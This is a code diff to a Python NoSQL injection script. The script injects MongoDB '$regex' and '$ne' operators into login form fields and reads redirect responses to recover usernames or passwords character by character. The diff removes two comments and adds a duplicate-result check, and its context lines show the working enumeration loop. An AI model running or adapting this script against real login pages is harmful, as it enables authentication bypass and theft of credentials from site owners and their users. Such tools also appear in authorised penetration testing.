@@ -69,7 +69,7 @@ def main():
         para = {enum_parameter + '[$regex]': "^" + payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}
 
         try:
-            r = session.request(method=method, url=url, data=para, allow_redirects=False, timeout=10)  # Fixed the method argument
+            r = session.request(method=method, url=url, data=para, allow_redirects=False, timeout=10)
             r.raise_for_status()
 
             if r.status_code == 302:
@@ -83,7 +83,7 @@ def main():
                         para = {enum_parameter + '[$regex]': "^" + new_payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}
 
                         try:
-                            r = session.request(method=method, url=url, data=para, timeout=10)  # Fixed the method argument
+                            r = session.request(method=method, url=url, data=para, timeout=10)
                             r.raise_for_status()
 
                             if r.status_code == 302:
@@ -95,9 +95,10 @@ def main():
                             print(Fore.RED + "Error occurred during request:", e)
                             break
 
-                print(Fore.GREEN + f"{enum_parameter} found: {userpass}")
-                final_output.append(userpass)
-                count += 1
+                if userpass not in final_output:
+                    print(Fore.GREEN + f"{enum_parameter} found: {userpass}")
+                    final_output.append(userpass)
+                    count += 1
 
         except requests.exceptions.RequestException as e:
             print(Fore.RED + "Error occurred during request:", e)
